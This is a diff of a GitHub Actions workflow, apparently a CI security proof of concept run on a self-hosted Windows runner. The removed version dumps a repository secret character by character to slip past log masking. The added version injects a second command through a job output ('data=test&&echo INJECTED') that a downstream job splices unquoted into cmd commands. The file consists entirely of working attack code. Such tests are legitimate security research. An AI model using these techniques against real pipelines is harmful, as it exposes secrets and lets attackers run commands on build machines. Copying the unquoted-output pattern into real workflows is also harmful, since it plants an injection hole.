@@ -1,13 +1,24 @@
-name: full-secret-leak-poc
+name: job-output-injection-test
 on: workflow_dispatch
 jobs:
-  exploit:
+  producer:
     runs-on: [self-hosted, Windows, X64]
+    outputs:
+      user_data: ${{ steps.generate.outputs.data }}
     steps:
-      - name: Extract Complete Secret
-        env:
-          SECRET: ${{ secrets.TEST_SECRET }}
+      - name: Generate Malicious Output
+        id: generate
         shell: cmd
         run: |
-          echo Extracting full secret character by character:
-          for /L %%i in (0,1,20) do @call echo Char %%i: %%SECRET:~%%i,1%%
+          echo data=test^&^&echo INJECTED > %GITHUB_OUTPUT%
+          
+  consumer:
+    needs: producer
+    runs-on: [self-hosted, Windows, X64]
+    steps:
+      - name: Use Output in Command
+        shell: cmd
+        run: |
+          echo Processing: ${{ needs.producer.outputs.user_data }}
+          set VAR=${{ needs.producer.outputs.user_data }}
+          echo Done
